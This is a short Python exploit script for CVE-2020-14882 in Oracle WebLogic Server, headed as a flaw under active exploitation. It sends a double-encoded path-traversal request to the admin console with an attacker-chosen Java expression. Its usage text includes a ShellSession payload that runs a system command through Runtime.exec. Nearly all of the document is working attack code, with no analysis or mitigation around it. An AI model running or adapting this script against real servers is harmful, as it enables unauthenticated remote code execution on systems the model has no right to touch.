# Oracle WebLogic Server Under Active Exploitation (CVE-2020-14882)

from argparse import ArgumentParser
from requests import get
parser = ArgumentParser()
print('''QeeqBox falcon (CVE-2020-14882 [passed])

How to Use: 
CVE-2020-14882.py --target url --payload java

target 	[Required]
payload [Not required, default is java.lang.String("test")]

Examples:
2020-14882.py --target http://1.1.1.1
2020-14882.py --target https://1.1.1.1 --payload java.lang.String("test")
2020-14882.py --target https://1.1.1.1 --payload com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec("calc.exe");");
''')
headers = {
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
 'Content-Type':'text/xml'
}
payload = '/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle='
parser.add_argument("--target", type=str)
parser.add_argument("--payload",type=str,required=False)
args = parser.parse_args()
if args.target:
	if args.payload:
		payload += args.payload
	else:
		payload += "java.lang.String(\"test\")"
	try:
		print("Executing -> "+ args.target+payload)
		get(args.target+payload,headers=headers,timeout=5,verify=False)
	except:
		pass
